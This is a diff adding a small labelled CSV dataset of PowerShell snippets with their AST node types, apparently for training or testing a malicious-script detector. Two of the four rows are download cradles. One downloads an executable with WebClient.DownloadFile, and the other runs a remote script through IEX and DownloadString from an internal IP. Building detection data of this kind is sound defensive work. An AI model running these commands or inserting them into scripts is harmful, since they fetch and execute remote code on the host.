@@ -1,0 +1,5 @@
+"no","code","name","ast"
+"1","$a = 1","normal","VariableExpressionAst ConstantExpressionAst CommandExpressionAst AssignmentStatementAst NamedBlockAst"
+"2","powershell (new-object system.net.webclient).downloadfile('http://192.168.10.11/test.exe','test.exe');","malicious","StringConstantExpressionAst StringConstantExpressionAst StringConstantExpressionAst CommandAst PipelineAst ParenExpressionAst StringConstantExpressionAst StringConstantExpressionAst StringConstantExpressionAst InvokeMemberExpressionAst CommandAst PipelineAst NamedBlockAst"
+"3","powershell -c IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.10.11/test.ps1')","malicious","StringConstantExpressionAst CommandParameterAst StringConstantExpressionAst StringConstantExpressionAst StringConstantExpressionAst CommandAst PipelineAst ParenExpressionAst StringConstantExpressionAst StringConstantExpressionAst InvokeMemberExpressionAst CommandAst PipelineAst NamedBlockAst"
+"4","$a = 1 + 2","normal","VariableExpressionAst ConstantExpressionAst ConstantExpressionAst BinaryExpressionAst CommandExpressionAst AssignmentStatementAst NamedBlockAst"
